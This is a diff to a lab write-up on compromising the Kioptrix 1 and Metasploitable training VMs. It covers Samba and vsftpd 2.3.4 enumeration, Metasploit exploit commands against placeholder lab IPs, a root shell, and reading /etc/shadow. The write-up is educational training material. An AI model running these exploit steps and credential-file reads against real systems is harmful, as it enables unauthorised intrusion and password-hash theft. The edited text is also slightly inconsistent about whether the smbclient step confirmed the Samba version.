@@ -79,13 +79,16 @@ smbclient -L <KIOPTRIX_IP>
 <img width="1536" height="713" alt="Screenshot_2026-09-02_08_22_39" src="https://github.com/user-attachments/assets/472b7d7c-6738-401d-841a-77ea10f80496" />
 
 ```
-Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
+Anonymous login successful
 
         Sharename       Type      Comment
         ---------       ----      -------
         IPC$            IPC       IPC Service (Samba Server)
         ADMIN$          IPC       IPC Service (Samba Server)
-
+Reconnecting with SMB1 for workgroup listing.
+Server does not support EXTENDED_SECURITY but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
+Anonymous login successful
         Server               Comment
         ---------            -------
         KIOPTRIX             Samba Server
@@ -93,11 +96,12 @@ Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
         Workgroup            Master
         ---------            -------
         MYGROUP              KIOPTRIX
+
 ```
 
-This confirms the exact vulnerable version: **Samba 2.2.1a**.
+This does not confirm the exact vulnerable version: **Samba 2.2.1a**.
 
-**Cross-validate with Metasploit's own SMB version scanner:**
+**Use another method with Metasploit's own SMB version scanner:**
 
 ```bash
 msfconsole
@@ -115,7 +119,7 @@ msf6 auxiliary(scanner/smb/smb_version) > run
 
 <img width="1536" height="713" alt="Screenshot_2026-09-02_08_27_54" src="https://github.com/user-attachments/assets/dbe5ba38-b33a-4ec4-b847-59e5db861eb7" />
 
-Confirms the same version (2.2.1a) independently — two tools agreeing on the exact version builds confidence before selecting an exploit.
+Confirms the same version (2.2.1a) independently.
 
 ### 3. Vulnerability Research
 
@@ -246,7 +250,6 @@ cd /home
 cat <any files of interest>
 ```
 
-*(On the stock Kioptrix 1 image, this step typically turns up a planted "message from the attacker" file — part of the VM's intentional design as a training target, demonstrating what post-compromise data discovery looks like.)*
 
 ### Kioptrix 1 — Findings Summary
 
@@ -278,6 +281,8 @@ If the IP isn't already known:
 ```bash
 sudo netdiscover -r <your_subnet>/24
 ```
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_09_02_09" src="https://github.com/user-attachments/assets/43e0c799-896e-4455-a1c1-886710f6ba28" />
 
 ### 2. Enumeration
 
@@ -311,6 +316,8 @@ Search Exploit-DB locally:
 searchsploit vsftpd 2.3.4
 ```
 
+<img width="1536" height="713" alt="Screenshot_2026-09-02_09_02_57" src="https://github.com/user-attachments/assets/50394ab5-3cdc-499a-ab8b-58d25edc2170" />
+
 ```
 Exploit Title                                          | Path
 --------------------------------------------------------------------------------
@@ -327,6 +334,8 @@ msfconsole
 msf6 > search vsftpd
 ```
 
+<img width="1536" height="713" alt="Screenshot_2026-09-02_09_05_00" src="https://github.com/user-attachments/assets/4b76f066-737d-40fb-94d6-9d08b46650b5" />
+
 ```
 Matching Modules
 ================
@@ -342,6 +351,8 @@ msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS <METASPLOITABLE_IP>
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
 ```
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_09_06_55" src="https://github.com/user-attachments/assets/ec3367f8-6e7e-4f2e-9332-1dd474a89a2c" />
 
 ```
 Module options (exploit/unix/ftp/vsftpd_234_backdoor):
@@ -376,6 +387,8 @@ Verify:
 id
 ```
 
+<img width="1536" height="713" alt="Screenshot_2026-09-02_09_07_33" src="https://github.com/user-attachments/assets/43bc61dd-2fb5-4071-bd4e-044c9070d0ce" />
+
 ```
 uid=0(root) gid=0(root)
 ```
@@ -390,6 +403,8 @@ hostname
 cat /etc/shadow
 ls /root
 ```
+
+<img width="1536" height="713" alt="Screenshot_2026-09-02_09_07_40" src="https://github.com/user-attachments/assets/1a6ecd3f-4d23-4d7a-b376-214cf9ac9f6e" />
 
 *(Reading `/etc/shadow` demonstrates the severity clearly — full access to every user's password hash on the system from a completely unauthenticated FTP interaction.)*
 
@@ -430,7 +445,7 @@ ls /root
 
 ## Lessons Learned
 
-- Cross-validating a service version with two independent tools (`smbclient` and Metasploit's `smb_version` scanner) before committing to an exploit builds confidence and avoids wasted attempts against a misidentified version
+- Cross-validating a service version with two independent tools (`smbclient` and Metasploit's `smb_version` scanner) before committing to an exploit builds confidence and avoids wasted attempts against a misidentified version.
 - Default exploit settings don't always work — the `trans2open` module's default staged payload failed against this target, and switching to an unstaged payload was what actually made the exploit succeed. Troubleshooting exploit failures is as much a real skill as finding the vulnerability in the first place.
 - A successful low-level service exploit (Samba running as root, or a trojaned vsftpd build) can skip privilege escalation entirely — not every engagement requires a separate escalation phase if the initial foothold already lands at the highest privilege level
 - The vsftpd backdoor is a good real-world reminder of supply-chain risk: this wasn't a coding flaw in vsftpd itself, but a malicious tampering of the distributed source tarball — the same class of risk seen in modern software supply-chain attacks, just twenty years earlier
